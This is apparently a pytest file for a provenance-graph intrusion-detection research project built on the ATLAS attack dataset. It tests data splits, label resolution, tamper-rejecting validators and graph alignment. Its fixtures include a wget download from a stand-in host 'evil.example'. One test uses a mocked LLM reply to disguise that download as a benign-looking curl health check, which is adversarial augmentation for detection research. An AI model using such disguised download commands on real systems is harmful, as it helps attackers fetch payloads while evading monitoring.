    handler.snapshots = []
    for timestamp, label in [(1704067200, 0), (1704153600, 1), (1704153660, 1)]:
        graph = ig.Graph(directed=True)
        graph.add_vertex(timestamp=timestamp, label=label)
        handler.snapshots.append(graph)

    train_ids, test_ids, _meta = build_split(handler, 0.7)

    assert train_ids == [0, 1, 2]
    assert test_ids == []


def test_graph_units_are_built_only_from_requested_training_snapshots():
    class Handler:
        pass

    handler = Handler()
    handler.snapshots = []
    for snapshot_id, label in [(0, 0), (1, 1)]:
        graph = ig.Graph(directed=True)
        graph.add_vertex(name=f"n{snapshot_id}", type="process", properties="cmd,1,/bin/cmd", label=label)
        handler.snapshots.append(graph)

    benign, attacks = build_graph_units(handler, [0], r_hop=4)

    assert len(benign) == 1
    assert attacks == []
    assert benign[0][1].snapshot_id == 0
    assert benign[0][0].vs["_athena_anchor"] == [True]


def test_lazy_attack_wl_index_is_run_cached_and_materialization_is_bounded(monkeypatch):
    import src.augmentation.subgraph_retrieval as retrieval

    class Handler:
        pass

    handler = Handler()
    graph = ig.Graph(directed=True)
    graph.add_vertices(6)
    graph.vs["name"] = [f"n{i}" for i in range(6)]
    graph.vs["type"] = ["process"] * 6
    graph.vs["properties"] = [f"cmd{i},1,/bin/cmd{i}" for i in range(6)]
    graph.vs["label"] = [0, 1, 1, 1, 1, 1]
    graph.add_edges([(0, index) for index in range(1, 6)])
    graph.es["actions"] = ["read"] * 5
    handler.snapshots = [graph]
    benign, attacks = build_graph_units(handler, [0], r_hop=1, max_cached_units=2)
    anchor, _ref = benign[0]
    original = retrieval.wl_subtree_labels
    calls = {"count": 0}

    def counted(*args, **kwargs):
        calls["count"] += 1
        return original(*args, **kwargs)

    monkeypatch.setattr(retrieval, "wl_subtree_labels", counted)
    cache = {}
    top_k_similar_attacks(anchor, attacks, k=2, _attack_hist_cache=cache)
    first_calls = calls["count"]
    top_k_similar_attacks(anchor, attacks, k=2, _attack_hist_cache=cache)

    assert len(cache) == len(attacks) == 5
    assert calls["count"] == first_calls + 1  # only the benign anchor is recomputed
    assert attacks.cache_size <= 2


def _write_atlas_indexed_family(root: Path, scenarios, hosts=("H1",)):
    for scenario_index, scenario in enumerate(scenarios):
        scenario_root = root / scenario
        scenario_root.mkdir(parents=True, exist_ok=True)
        malicious_name = f"attack-{scenario.lower()}"
        (scenario_root / "malicious_labels.txt").write_text(
            malicious_name + "\n", encoding="utf-8",
        )
        for host_index, host in enumerate(hosts):
            timestamp = 1_000_000 + scenario_index * 100_000 + host_index * 1_000
            pd.DataFrame([
                {
                    "actorID": malicious_name,
                    "actor_type": "SUBJECT_PROCESS",
                    "objectID": f"file-{scenario.lower()}-{host.lower()}",
                    "object": "FILE_OBJECT_BLOCK",
                    "action": "write",
                    "timestamp": timestamp,
                    "timestamp_unit": "ms",
                },
                {
                    "actorID": f"benign-{scenario.lower()}-{host.lower()}",
                    "actor_type": "SUBJECT_PROCESS",
                    "objectID": f"file-{scenario.lower()}-{host.lower()}",
                    "object": "FILE_OBJECT_BLOCK",
                    "action": "read",
                    "timestamp": timestamp + 10,
                    "timestamp_unit": "ms",
                },
            ]).to_csv(scenario_root / f"{host}_events.csv", index=False)


def test_atlas_single_host_original_leave_one_attack_out(tmp_path):
    _write_atlas_indexed_family(tmp_path, ATLAS_SINGLE_FOLDS)
    handler = ATLASHandler(tmp_path, True, scene_name="S1")
    handler.load()
    handler.build_graph("atlas")

    train_ids, test_ids, meta = build_split(handler, 0.70)

    assert meta["mode"] == ATLAS_SPLIT_MODE
    assert meta["fold"] == "S1"
    assert meta["train_scenarios"] == ["S2", "S3", "S4"]
    assert meta["test_scenarios"] == ["S1"]
    assert {handler.snapshot_scenarios[index] for index in train_ids} == {"S2", "S3", "S4"}
    assert {handler.snapshot_scenarios[index] for index in test_ids} == {"S1"}
    assert any(1 in graph.vs["label"] for graph in handler.snapshots)
    assert all(
        str(value).startswith("atlas:")
        for graph in handler.snapshots
        for value in graph.vs["_athena_temporal_id"]
    )
    _benign_units, attack_units = build_graph_units(handler, train_ids, r_hop=1)
    assert attack_units
    assert all(
        handler.snapshot_scenarios[reference.snapshot_id] != "S1"
        for _graph, reference in attack_units
    )


def test_atlas_multi_host_original_leave_one_attack_out(tmp_path):
    _write_atlas_indexed_family(tmp_path, ATLAS_MULTI_FOLDS, hosts=("H1", "H2"))
    handler = ATLASHandler(tmp_path, True, scene_name="M3")
    handler.load()
    handler.build_graph("atlas")

    train_ids, test_ids, meta = build_split(handler, 0.70)

    assert meta["mode"] == ATLAS_SPLIT_MODE
    assert meta["fold"] == "M3"
    assert set(meta["train_scenarios"]) == {"M1", "M2", "M4", "M5", "M6"}
    assert {handler.snapshot_scenarios[index] for index in test_ids} == {"M3"}
    assert {handler.snapshot_hosts[index] for index in test_ids} == {"H1", "H2"}
    assert set(train_ids).isdisjoint(test_ids)
    assert "atlas" in DETECTION_DATASETS


def test_atlas_metric_labels_come_from_v1_handler_not_atlasv2_registry():
    labels = load_malicious_uuids("atlas", "M1")
    assert labels == set()


def _write_official_atlas_single_host_family(root: Path):
    for index, scenario in enumerate(ATLAS_SINGLE_FOLDS, 1):
        case = root / "training_logs" / f"{scenario}-linux-h1"
        logs = case / "logs"
        logs.mkdir(parents=True)
        (case / "malicious_labels.txt").write_text(
            f"/tmp/payload-{scenario.lower()}\n", encoding="utf-8",
        )
        (logs / "audit.interpret.log").write_text(
            "----\n"
            f"01/0{index}/2024 12:00:00.000 pid={100 + index} ppid=1 "
            f"exe=/bin/bash syscall=open name=/tmp/payload-{scenario.lower()}\n"
            "----\n",
            encoding="utf-8",
        )


def test_atlas_official_v1_raw_input_and_same_source_labels(tmp_path):
    _write_official_atlas_single_host_family(tmp_path)
    handler = ATLASHandler(
        tmp_path, True, scene_name="S1", source_timezone="-05:00",
    )
    handler.load()
    handler.build_graph("atlas")

    assert handler.label_coverage_audit
    assert all(row["resolved_entity_count"] == 1 for row in handler.label_coverage_audit)
    assert any(1 in graph.vs["label"] for graph in handler.snapshots)
    assert all(graph["host_id"] == "H1" for graph in handler.snapshots)
    assert all(
        edge["event_id"] and edge["event_order"] >= 0
        for graph in handler.snapshots for edge in graph.es
    )


def test_atlas_official_label_projection_is_endpoint_wise(tmp_path):
    case = tmp_path / "S1-linux-h1"
    case.mkdir()
    frame = pd.DataFrame([{
        "actorID": "/bin/evil_42",
        "objectID": "/tmp/output",
        "command": "/bin/evil --write /tmp/output",
        "arguments": "--write /tmp/output",
        "path": "/tmp/output",
        "address": "",
        "src_address": "",
        "dst_address": "",
    }])

    resolved, audit = resolve_case_label_ids(case, {"/bin/evil"}, frame)

    assert resolved == {"/bin/evil_42"}
    assert audit["matched_source_label_count"] == 1
    substring_resolved, _audit = resolve_case_label_ids(case, {"/bin/e"}, frame)
    assert substring_resolved == {"/bin/evil_42"}


def test_atlas_official_preprocessed_output_is_consumed(tmp_path):
    for index, scenario in enumerate(ATLAS_SINGLE_FOLDS, 1):
        output = tmp_path / scenario / "output"
        output.mkdir(parents=True)
        case_name = f"{scenario}-linux-h1"
        case = tmp_path / scenario / "training_logs" / case_name
        case.mkdir(parents=True)
        label = f"/tmp/payload-{scenario.lower()}"
        (case / "malicious_labels.txt").write_text(label + "\n", encoding="utf-8")
        fields = [""] * 20
        fields[0] = str(index * 1000)
        fields[3] = str(100 + index)
        fields[4] = "1"
        fields[5] = "/bin/bash"
        fields[17] = "file_write_"
        fields[18] = label
        suffix = "-" if scenario == "S3" else "+"
        (output / f"training_preprocessed_logs_{case_name}").write_text(
            ",".join(fields) + f"-LA{suffix}\n", encoding="utf-8",
        )

    handler = ATLASHandler(tmp_path, True, scene_name="S1")
    handler.load()
    handler.build_graph("atlas")

    assert all(
        audit["label_mode"] == "official_normalized_endpoint_substring"
        for audit in handler.label_coverage_audit
    )
    s3_audit = next(audit for audit in handler.label_coverage_audit if audit["scenario"] == "S3")
    assert s3_audit["endpoint_only_positive_events"] == 1
    labelled = [
        vertex
        for graph in handler.snapshots for vertex in graph.vs
        if int(vertex["label"]) == 1
    ]
    assert labelled
    assert all(str(vertex["name"]).startswith("/tmp/payload-") for vertex in labelled)


def test_atlas_official_19_field_lb_row_repairs_only_missing_host_column(tmp_path):
    path = tmp_path / "training_preprocessed_logs_S2-windows-h1"
    # Public ATLAS S1.zip, S2-CVE-2015-3105_windows, line 23445.  The
    # upstream Firefox preprocessor omitted the host column at index 14.
    released_lb_row = (
        "22319858,,,,,,,,,,response,,,302,,"
        "//a.clickcertain.com/px/img/bidswitch/?bidswitch_ssp_id=pubmatic,,,-LB-"
    )
    valid_fields = [""] * 20
    valid_fields[0] = "22319859"
    valid_fields[3] = "42"
    valid_fields[5] = "c:/windows/system32/cmd.exe"
    valid_fields[17] = "file_write_"
    valid_fields[18] = "c:/temp/payload.bin"
    path.write_text(
        released_lb_row + "\n" + ",".join(valid_fields) + "-LA+\n",
        encoding="utf-8",
    )

    frame = convert_preprocessed_file(path)

    assert not frame.empty
    assert set(frame["timestamp_unit"]) == {"s"}

    invalid = tmp_path / "training_preprocessed_logs_S3-windows-h1"
    invalid.write_text(",".join(valid_fields[:-2]) + "-LA+\n", encoding="utf-8")
    with pytest.raises(ValueError, match="20 fields"):
        convert_preprocessed_file(invalid)


def test_atlas_preprocessed_scanner_deduplicates_released_multi_host_outputs(tmp_path):
    names = (
        "training_preprocessed_logs_M1-windows-h1",
        "training_preprocessed_logs_M1-linux-h2",
    )
    for directory_name in ("h1", "h2"):
        output = tmp_path / "M1" / directory_name / "output"
        output.mkdir(parents=True)
        for index, name in enumerate(names):
            (output / name).write_bytes(f"same released file {index}\n".encode())

    discovered = discover_preprocessed_files(tmp_path, {"M1"})

    assert {path.name for path in discovered} == set(names)
    assert len(discovered) == 2
    assert all("/h1/output/" in str(path) for path in discovered)


def test_atlas_preprocessed_scanner_prefers_testing_copy_across_folds(tmp_path):
    pairs = (("S1", "S2", b"official-s1-stream\n"),
             ("S2", "S1", b"official-s2-stream\n"))
    for scenario, other_fold, content in pairs:
        testing = tmp_path / scenario / "output" / f"testing_preprocessed_logs_{scenario}-windows-h1"
        duplicate = tmp_path / other_fold / "output" / f"training_preprocessed_logs_{scenario}-windows-h1"
        testing.parent.mkdir(parents=True, exist_ok=True)
        duplicate.parent.mkdir(parents=True, exist_ok=True)
        testing.write_bytes(content)
        duplicate.write_bytes(content)

    discovered = discover_preprocessed_files(tmp_path, {"S1", "S2"})

    assert len(discovered) == 2
    assert all(path.name.startswith("testing_preprocessed_logs_") for path in discovered)
    assert {path.name.split("_", 3)[-1].split("-", 1)[0] for path in discovered} == {"S1", "S2"}


def _write_minimal_official_atlas_release(root: Path):
    for scenario_index, scenario in enumerate((*ATLAS_SINGLE_FOLDS, *ATLAS_MULTI_FOLDS), 1):
        hosts = ("H1",) if scenario.startswith("S") else ("H1", "H2")
        for host_index, host in enumerate(hosts, 1):
            case_name = f"{scenario}-windows-{host.lower()}"
            base = root / scenario if scenario.startswith("S") else root / scenario / "h1"
            output = base / "output"
            case = base / "testing_logs" / case_name
            output.mkdir(parents=True, exist_ok=True)
            case.mkdir(parents=True, exist_ok=True)
            label = f"c:/attack/{scenario.lower()}-{host.lower()}.bin"
            (case / "malicious_labels.txt").write_text(label + "\n", encoding="utf-8")
            fields = [""] * 20
            fields[0] = str(scenario_index * 10_000 + host_index)
            fields[3] = str(100 + scenario_index * 10 + host_index)
            fields[4] = "1"
            fields[5] = "c:/windows/system32/cmd.exe"
            fields[17] = "file_write_"
            fields[18] = label
            (output / f"testing_preprocessed_logs_{case_name}").write_text(
                ",".join(fields) + "-LA+\n", encoding="utf-8",
            )


def _rewrite_atlas_testing_windows(root: Path, scenario: str, count: int):
    paths = [
        path for path in root.rglob(f"testing_preprocessed_logs_{scenario}-*")
        if path.is_file() and (not scenario.startswith("M") or "/h1/output/" in str(path))
        and (not scenario.startswith("M") or path.name.lower().endswith(("-h1", "_h1")))
    ]
    assert len(paths) == 1
    label_path = next(
        path for path in root.rglob("malicious_labels.txt")
        if f"/{scenario}/" in str(path) and "/testing_logs/" in str(path)
        and (not scenario.startswith("M") or any(token in str(path) for token in ("_h1/", "-h1/")))
    )
    label = label_path.read_text().splitlines()[0]
    rows = []
    for index in range(count):
        fields = [""] * 20
        fields[0] = str(1_000_000 + index * 60)
        fields[3] = str(1000 + index)
        fields[4] = "1"
        fields[5] = "c:/windows/system32/cmd.exe"
        fields[17] = "file_write_"
        fields[18] = label
        rows.append(",".join(fields) + "-LA+\n")
    paths[0].write_text("".join(rows), encoding="utf-8")


def test_atlas_v1_source_audit_generator_uses_official_structure(tmp_path):
    input_root, zip_dir, output_dir = (tmp_path / name for name in ("paper", "zips", "out"))
    _write_minimal_official_atlas_release(input_root)
    zip_dir.mkdir()
    for scenario in (*ATLAS_SINGLE_FOLDS, *ATLAS_MULTI_FOLDS):
        (zip_dir / f"{scenario}.zip").write_bytes(f"official-{scenario}".encode())
    paper = tmp_path / "atlas.pdf"
    paper.write_bytes(b"official paper fixture")

    result = build_atlas_v1_source_audit(
        input_root, zip_dir, paper, output_dir,
        "e46096d1947e4f059e73a0ac2b9a9707812fd4bc",
    )
    rows = [json.loads(line) for line in result["records"].read_text().splitlines()]
    manifest = json.loads(result["manifest"].read_text())

    assert result["record_count"] == len(rows) == 16
    assert len({row["source_id"] for row in rows}) == 16
    assert manifest["record_count"] == 16
    assert all(row["boundary"]["event_sha256"] for row in rows)
    assert all(
        candidate["status"] == "candidate_not_official_atlas_annotation"
        for row in rows for candidate in row["attack_mapping_candidates"]
    )


def test_atlas_mapping_snapshots_follow_runtime_family_coordinates(tmp_path):
    root = tmp_path / "paper"
    _write_minimal_official_atlas_release(root)
    for scenario, count in {"S1": 45, "S2": 236, "S3": 37, "S4": 32}.items():
        _rewrite_atlas_testing_windows(root, scenario, count)
    _rewrite_atlas_testing_windows(root, "M1", 163)

    single = ATLASHandler(root, True, scene_name="S1")
    single.load()
    single.build_graph()
    assert [single.snapshots[index]["source_scene"] for index in (34, 239, 308, 330)] == [
        "S1", "S2", "S3", "S4",
    ]
    multi = ATLASHandler(root, True, scene_name="M1")
    multi.load()
    multi.build_graph()
    assert multi.snapshots[42]["source_scene"] == "M1"

    mapping_root = Path(__file__).resolve().parents[1] / "data/annotated_labels/atlas/attack_techniques"
    mappings = [json.loads(line) for line in (mapping_root / "mapping_records.jsonl").read_text().splitlines()]
    by_scene = {row["scene"]: row["boundary"] for row in mappings}
    assert [by_scene[scene]["snapshot"] for scene in ("S1", "S2", "S3", "S4")] == [34, 239, 308, 330]
    assert [by_scene[scene]["source_global_snapshot"] for scene in ("S1", "S2", "S3", "S4")] == [
        1261, 1466, 1535, 1557,
    ]
    assert by_scene["M1"]["snapshot"] == by_scene["M1"]["source_global_snapshot"] == 42


def _copy_atlas_source_linked_registry(destination: Path) -> Path:
    source = Path(__file__).resolve().parents[1] / "data/annotated_labels/atlas/source_linked"
    destination.mkdir(parents=True)
    for name in (
        "atlas_v1_source_link_audit.json", "atlas_v1_source_link_endpoints.jsonl",
        "atlas_v1_source_link_manifest.json",
    ):
        (destination / name).write_bytes((source / name).read_bytes())
    return destination


def test_bundled_atlas_v1_source_linked_registry_is_valid():
    ok, detail = _atlas_source_linked_registry()

    assert ok
    assert detail["records"] == 228
    assert detail["host_streams"] == 16


def test_atlas_v1_final_attack_mappings_are_endpoint_specific_and_valid():
    ok, detail = _atlas_attack_technique_schema()
    root = Path(__file__).resolve().parents[1] / "data/annotated_labels/atlas/attack_techniques"
    rows = [json.loads(line) for line in (root / "source_linked_annotations.jsonl").read_text().splitlines()]
    evidence = [json.loads(line) for line in (root / "source_records.jsonl").read_text().splitlines()]

    assert ok, detail
    assert detail["annotations"] == 10
    assert detail["technique_counts"] == {"T1566.002": 6, "T1566.001": 4}
    assert {row["host_id"] for row in rows} == {"H1"}
    assert all(row["reference_technique"] != "T1041" for row in rows)
    assert all(
        (row["reference_technique"] == "T1566.002" and row["anchor_type"] == "web_object")
        or (
            row["reference_technique"] == "T1566.001"
            and row["anchor_type"] == "file"
            and row["event_action"] == "file_write"
            and row["anchor_role"] == "target"
        )
        for row in rows
    )
    pa_counts = {
        row["endpoint_record"]["scene"]: (
            row["occurrence_audit"]["occurrence_count"],
            row["occurrence_audit"]["delivery_candidate_count"],
        )
        for row in evidence if row["paper_source"]["feature"] == "PA"
    }
    assert pa_counts == {"S3": (96, 3), "S4": (133, 3), "M4": (82, 4), "M6": (79, 3)}
    assert all(
        row["selected_boundary"] == row["occurrence_audit"]["delivery_candidates"][0]
        for row in evidence if row["paper_source"]["feature"] == "PA"
    )


def test_atlas_v1_final_attack_importer_rebuilds_reviewed_selection(tmp_path, monkeypatch):
    source = Path(__file__).resolve().parents[1] / "data/annotated_labels/atlas/source_linked/atlas_v1_source_link_endpoints.jsonl"
    paper = tmp_path / "atlas.pdf"
    paper.write_bytes(b"official paper fixture")
    monkeypatch.setattr(
        atlas_attack_importer, "ATLAS_PAPER_SHA256",
        hashlib.sha256(paper.read_bytes()).hexdigest(),
    )
    bundled_evidence = Path(__file__).resolve().parents[1] / "data/annotated_labels/atlas/attack_techniques/source_records.jsonl"
    occurrence_audits = {
        row["endpoint_record"]["source_id"]: row["occurrence_audit"]
        for row in (json.loads(line) for line in bundled_evidence.read_text().splitlines())
        if row["paper_source"]["feature"] == "PA"
    }
    monkeypatch.setattr(
        atlas_attack_importer, "_pa_occurrence_audit",
        lambda _root, endpoint: occurrence_audits[endpoint["source_id"]],
    )

    result = atlas_attack_importer.build(source, paper, tmp_path / "unused", tmp_path / "out")
    annotations = [json.loads(line) for line in result["annotations"].read_text().splitlines()]

    assert result["count"] == 10
    assert {row["scene"] for row in annotations} == {
        "S1", "S2", "S3", "S4", "M1", "M2", "M3", "M4", "M5", "M6",
    }


def _copy_atlas_attack_mappings(destination: Path) -> Path:
    repo = Path(__file__).resolve().parents[1]
    source = repo / "data/annotated_labels/atlas/attack_techniques"
    source_linked = repo / "data/annotated_labels/atlas/source_linked"
    destination.mkdir(parents=True)
    sibling = destination.parent / "source_linked"
    sibling.mkdir(parents=True)
    for name in (
        "source_records.jsonl", "source_linked_annotations.jsonl",
        "mapping_records.jsonl", "content_manifest.json",
    ):
        (destination / name).write_bytes((source / name).read_bytes())
    (sibling / "atlas_v1_source_link_endpoints.jsonl").write_bytes(
        (source_linked / "atlas_v1_source_link_endpoints.jsonl").read_bytes()
    )
    return destination


def test_atlas_v1_final_mapping_evaluator_rejects_event_hash_tampering(tmp_path):
    root = _copy_atlas_attack_mappings(tmp_path / "atlas" / "attack_techniques")
    mapping_path = root / "mapping_records.jsonl"
    rows = [json.loads(line) for line in mapping_path.read_text().splitlines()]
    rows[0]["boundary"]["event_sha256"] = "0" * 64
    mapping_path.write_text("".join(json.dumps(row) + "\n" for row in rows))

    with pytest.raises(ValueError, match="exact official-v1 event"):
        load_ground_truth(mapping_path)


def test_atlas_v1_final_mapping_validator_rejects_review_basis_tampering(tmp_path):
    root = _copy_atlas_attack_mappings(tmp_path / "atlas" / "attack_techniques")
    evidence_path = root / "source_records.jsonl"
    rows = [json.loads(line) for line in evidence_path.read_text().splitlines()]
    rows[0]["review"]["criterion"] = "scene_feature_only"
    payload = dict(rows[0])
    payload.pop("record_sha256")
    rows[0]["record_sha256"] = artifact_canonical_hash(payload)
    evidence_path.write_text("".join(json.dumps(row) + "\n" for row in rows))

    ok, _detail = _atlas_attack_technique_schema(root)

    assert not ok


def test_atlas_v1_final_mapping_validator_rejects_self_consistent_boundary_rewrite(tmp_path):
    root = _copy_atlas_attack_mappings(tmp_path / "atlas" / "attack_techniques")
    evidence_path = root / "source_records.jsonl"
    annotation_path = root / "source_linked_annotations.jsonl"
    mapping_path = root / "mapping_records.jsonl"
    manifest_path = root / "content_manifest.json"
    evidence_rows = [json.loads(line) for line in evidence_path.read_text().splitlines()]
    target = next(row for row in evidence_rows if row["paper_source"]["feature"] == "PA")
    old_record_hash = target["record_sha256"]
    selected = target["selected_boundary"]
    selected["event_id"] = "atlas-v1:" + "f" * 64
    selected["event_sha256"] = "e" * 64
    target["occurrence_audit"]["selected_boundary"] = selected
    target["occurrence_audit"]["delivery_candidates"][0] = selected
    for occurrence in target["occurrence_audit"]["occurrences"]:
        if occurrence["event_order"] == selected["event_order"]:
            occurrence.update(selected)
            break
    payload = dict(target)
    payload.pop("record_sha256")
    target["record_sha256"] = artifact_canonical_hash(payload)
    evidence_path.write_text("".join(
        json.dumps(row, sort_keys=True, separators=(",", ":")) + "\n" for row in evidence_rows
    ))
    evidence_sha = hashlib.sha256(evidence_path.read_bytes()).hexdigest()

    annotations = [json.loads(line) for line in annotation_path.read_text().splitlines()]
    for row in annotations:
        row["source_hash"] = evidence_sha
        if row["source_record_sha256"] == old_record_hash:
            row["source_record_sha256"] = target["record_sha256"]
            row["event_id"] = selected["event_id"]
            row["source_event_sha256"] = selected["event_sha256"]
            row["source_locator"]["raw_event_id"] = selected["event_id"]
    annotation_path.write_text("".join(
        json.dumps(row, sort_keys=True, separators=(",", ":")) + "\n" for row in annotations
    ))
    mappings = [json.loads(line) for line in mapping_path.read_text().splitlines()]
    for row in mappings:
        row["source_hash"] = evidence_sha
        if row["source_record_sha256"] == old_record_hash:
            row["source_record_sha256"] = target["record_sha256"]
            row["boundary"]["event_id"] = selected["event_id"]
            row["boundary"]["event_sha256"] = selected["event_sha256"]
            row["boundary"]["source_event_sha256"] = selected["event_sha256"]
    mapping_path.write_text("".join(
        json.dumps(row, sort_keys=True, separators=(",", ":")) + "\n" for row in mappings
    ))
    manifest = json.loads(manifest_path.read_text())
    manifest["outputs"] = {
        evidence_path.name: evidence_sha,
        annotation_path.name: hashlib.sha256(annotation_path.read_bytes()).hexdigest(),
        mapping_path.name: hashlib.sha256(mapping_path.read_bytes()).hexdigest(),
    }
    manifest.pop("aggregate_sha256")
    manifest["aggregate_sha256"] = artifact_canonical_hash(manifest)
    manifest_path.write_text(json.dumps(manifest, sort_keys=True))

    ok, _detail = _atlas_attack_technique_schema(root)

    assert not ok


def test_atlas_source_linked_validator_rejects_finalized_candidate(tmp_path):
    root = _copy_atlas_source_linked_registry(tmp_path / "atlas")
    records_path = root / "atlas_v1_source_link_endpoints.jsonl"
    rows = [json.loads(line) for line in records_path.read_text().splitlines()]
    rows[0]["attack_mapping_candidates"][0]["status"] = "final_high_confidence"
    payload = dict(rows[0])
    payload.pop("derived_sha256")
    rows[0]["derived_sha256"] = hashlib.sha256(json.dumps(
        payload, ensure_ascii=False, sort_keys=True, separators=(",", ":"),
    ).encode()).hexdigest()
    records_path.write_text("".join(
        json.dumps(row, ensure_ascii=False, sort_keys=True, separators=(",", ":")) + "\n"
        for row in rows
    ))
    manifest_path = root / "atlas_v1_source_link_manifest.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["records"][0]["derived_sha256"] = rows[0]["derived_sha256"]
    manifest["aggregate_records_sha256"] = hashlib.sha256(b"".join(
        json.dumps(row, ensure_ascii=False, sort_keys=True, separators=(",", ":")).encode()
        for row in manifest["records"]
    )).hexdigest()
    manifest["files"][records_path.name] = {
        "sha256": hashlib.sha256(records_path.read_bytes()).hexdigest(),
        "size_bytes": records_path.stat().st_size,
    }
    manifest_path.write_text(json.dumps(manifest, ensure_ascii=False, indent=2, sort_keys=True) + "\n")

    ok, _detail = _atlas_source_linked_registry(root)

    assert not ok


def test_atlas_source_linked_validator_rejects_manifest_bound_file_tampering(tmp_path):
    root = _copy_atlas_source_linked_registry(tmp_path / "atlas")
    records_path = root / "atlas_v1_source_link_endpoints.jsonl"
    records_path.write_bytes(records_path.read_bytes() + b"\n")

    ok, _detail = _atlas_source_linked_registry(root)

    assert not ok


@pytest.mark.parametrize(
    ("raw_action", "preprocessed_action", "expected_action", "file_is_actor"),
    [
        ("ReadData", "file_readdata_", "file_read", True),
        ("WriteData", "file_write_", "file_write", False),
        ("Delete", "file_delete_", "file_delete", False),
        ("Execute", "file_execute_", "file_execute", True),
    ],
)
def test_atlas_windows_raw_and_preprocessed_file_events_are_directionally_identical(
    tmp_path, raw_action, preprocessed_action, expected_action, file_is_actor,
):
    case = tmp_path / "training_logs" / "S1-windows-h1"
    logs = case / "logs"
    logs.mkdir(parents=True)
    (case / "malicious_labels.txt").write_text("c:/temp/payload.bin\n", encoding="utf-8")
    (logs / "security_events.txt").write_text(
        "Audit Success 01/01/2024 12:00:00 PM\n"
        "New Process ID: 0x2a\n"
        "New Process Name: C:\\Windows\\System32\\cmd.exe\n"
        "Object Name: C:\\Temp\\payload.bin\n"
        f"Accesses: {raw_action}\n",
        encoding="utf-8",
    )
    raw = convert_official_case(case, "-05:00")

    fields = [""] * 20
    fields[0] = "1704139200"
    fields[3] = "42"
    fields[5] = "c:/windows/system32/cmd.exe"
    fields[17] = preprocessed_action
    fields[18] = "c:/temp/payload.bin"
    processed_path = tmp_path / "training_preprocessed_logs_S1-windows-h1"
    processed_path.write_text(",".join(fields) + "-LA+\n", encoding="utf-8")
    processed = convert_preprocessed_file(processed_path)

    raw_event = raw.loc[raw["action"] == expected_action].iloc[0]
    processed_event = processed.loc[processed["action"] == expected_action].iloc[0]
    assert (raw_event.actorID, raw_event.actor_type, raw_event.objectID, raw_event.object) == (
        processed_event.actorID,
        processed_event.actor_type,
        processed_event.objectID,
        processed_event.object,
    )
    assert (raw_event.actor_type == "file") is file_is_actor


@pytest.mark.parametrize(
    ("syscall", "preprocessed_action", "expected_action", "file_is_actor"),
    [
        ("read", "file_readdata_", "file_read", True),
        ("write", "file_write_", "file_write", False),
        ("unlink", "file_delete_", "file_delete", False),
        ("execve", "file_execute_", "file_execute", True),
    ],
)
def test_atlas_linux_raw_and_preprocessed_file_events_are_directionally_identical(
    tmp_path, syscall, preprocessed_action, expected_action, file_is_actor,
):
    case = tmp_path / "training_logs" / "S1-linux-h1"
    logs = case / "logs"
    logs.mkdir(parents=True)
    (case / "malicious_labels.txt").write_text("/tmp/payload.bin\n", encoding="utf-8")
    (logs / "audit.interpret.log").write_text(
        "----\n01/01/2024 12:00:00.000 pid=42 exe=/bin/bash "
        f"syscall={syscall} name=/tmp/payload.bin\n----\n",
        encoding="utf-8",
    )
    raw = convert_official_case(case, "-05:00")

    fields = [""] * 20
    fields[0] = "1704139200"
    fields[3] = "42"
    fields[5] = "/bin/bash"
    fields[17] = preprocessed_action
    fields[18] = "/tmp/payload.bin"
    processed_path = tmp_path / "training_preprocessed_logs_S1-linux-h1"
    processed_path.write_text(",".join(fields) + "-LA+\n", encoding="utf-8")
    processed = convert_preprocessed_file(processed_path)

    raw_event = raw.loc[raw["action"] == expected_action].iloc[0]
    processed_event = processed.loc[processed["action"] == expected_action].iloc[0]
    assert (raw_event.actorID, raw_event.actor_type, raw_event.objectID, raw_event.object) == (
        processed_event.actorID,
        processed_event.actor_type,
        processed_event.objectID,
        processed_event.object,
    )
    assert (raw_event.actor_type == "file") is file_is_actor


def test_attack_fidelity_requires_the_graph_unit_center_not_any_malicious_node():
    graph = ig.Graph(directed=True)
    graph.add_vertices(3)
    graph.vs["label"] = [1, 1, 0]
    graph.vs["_athena_anchor"] = [True, False, False]

    assert _region_contains_attack_anchor(graph, [0, 2]) is True
    assert _region_contains_attack_anchor(graph, [1, 2]) is False


def test_alignment_is_bounded_on_both_graphs():
    benign = ig.Graph(directed=False)
    benign.add_vertices(4)
    attack = ig.Graph(directed=False)
    attack.add_vertices(4)
    for graph in (benign, attack):
        graph.vs["type"] = ["process"] * 4
        graph.vs["properties"] = ["seed", "one", "two", "three"]
        graph.vs["label"] = [0] * 4
        graph.add_edges([(0, 1), (1, 2), (2, 3)])

    result = aligned_region_search(benign, attack, r_hop=1)

    assert result is not None
    _benign_region, attack_region, mapping, _score = result
    assert set(attack_region) == {0, 1}
    assert set(mapping) == {0, 1}


def test_semantic_strategy_replacement_is_symmetric():
    assert _assign_strategy("curl secret,1,/bin/curl", "process", {"curl"}, {"safe"}) == "replacement"
    assert _assign_strategy("evil safe,1,/bin/evil", "process", {"curl"}, {"safe"}) == "replacement"
    assert _assign_strategy("curl safe,1,/bin/curl", "process", {"curl"}, {"safe"}) == "rewriting"
    assert _assign_strategy("evil secret,1,/bin/evil", "process", {"curl"}, {"safe"}) == "extension"


def test_semantic_property_parser_uses_all_serialized_values_deterministically():
    graph = ig.Graph(directed=True)
    graph.add_vertex(
        type="process",
        properties="{'[unknown-process],,[unknown-path]', 'curl --safe,42,/usr/bin/curl'}",
    )

    assert _get_properties(graph, 0) == "curl --safe,42,/usr/bin/curl"


def test_atlas_json_property_round_trip_semantic_verifier_and_wl():
    attack_property = json.dumps({
        "entity_type": "process",
        "events": [{
            "role": "actor",
            "action": "file_read",
            "command": "wget",
            "arguments": "https://evil.example/payload",
            "path": "/usr/bin/wget",
            "address": "",
        }],
    }, sort_keys=True)
    context_property = json.dumps({
        "entity_type": "process",
        "events": [{
            "role": "actor",
            "action": "file_read",
            "command": "curl",
            "arguments": "-H X-Health-Check:true",
            "path": "/usr/bin/curl",
            "address": "",
        }],
    }, sort_keys=True)
    graph = ig.Graph(directed=True)
    graph.add_vertices(2)
    graph.vs["type"] = ["process", "process"]
    graph.vs["properties"] = [attack_property, context_property]
    graph.vs["label"] = [1, 0]
    graph.vs["_athena_boundary_context"] = [False, True]
    graph.add_edge(1, 0, actions="file_read")

    mutated = apply_semantic_mutation_llm(
        graph,
        [0],
        benign_commands={"wget", "curl"},
        benign_args={"safe", "-H X-Health-Check:true"},
        llm_fn=lambda _prompt: json.dumps({
            "new_command_name": "curl",
            "new_arguments": "-H X-Health-Check:true https://evil.example/payload",
        }),
    )

    assert mutated is not None
    payload = json.loads(mutated.vs[0]["properties"])
    assert payload["entity_type"] == "process"
    assert payload["events"][0]["command"] == "curl"
